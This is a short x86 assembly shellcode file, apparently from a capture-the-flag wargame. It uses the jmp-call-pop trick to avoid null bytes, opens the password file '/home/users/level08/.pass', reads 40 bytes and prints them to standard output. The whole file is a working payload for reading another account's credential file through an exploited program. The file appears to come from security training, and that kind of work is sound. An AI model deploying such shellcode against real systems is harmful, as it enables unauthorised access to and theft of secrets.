section .text

global _start

_start:
    jmp short hack

realStuff:
    ; fd = open(path, 0, O_RDONLY)
    xor eax, eax
    mov al, 0x5     ; eax = 5 - open
    pop ebx         ; ebx now points on the path
    xor ecx, ecx    ; no flags
    xor edx, edx    ; read only
    int 0x80

    mov byte [esp+40], 0xa ; add a newline for convenience

    ; read(fd, %esp, 40)
    mov ebx, eax    ; move fd into ebx
    mov al, 0x3     ; eax = 3 - read
    mov ecx, esp    ; ecx point to the stack buffer
    mov dl, 41      ; we want to read 40 bytes, but we'll write 41 next, so we can just put 41 here
    int 0x80

    ; write(1, %esp, 40)
    mov al, 0x4     ; eax = 4 - write
    mov bl, 0x1     ; STDOUT
    mov ecx, esp    ; stack buffer to write
    int 0x80

    ; exit
    mov al, 0x1
    int 0x80

hack:
    ; jump to realStuff but most importantly
    ; push the address just after this call on the stack
    call realStuff

path:
    db '/home/users/level08/.pass'
